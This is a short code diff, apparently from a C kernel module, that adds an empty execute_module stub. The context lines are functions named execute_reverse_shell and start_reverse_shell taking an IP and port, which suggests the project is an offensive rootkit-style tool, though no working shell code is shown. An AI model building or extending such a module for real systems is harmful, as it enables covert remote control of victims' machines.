@@ -35,6 +35,10 @@ void execute_reverse_shell(struct work_struct *work){
 
 }
 
+void execute_module (int module) {
+    
+}
+
 
 int start_reverse_shell(char* ip, char* port){
     //Reserve memory for parameters and start work
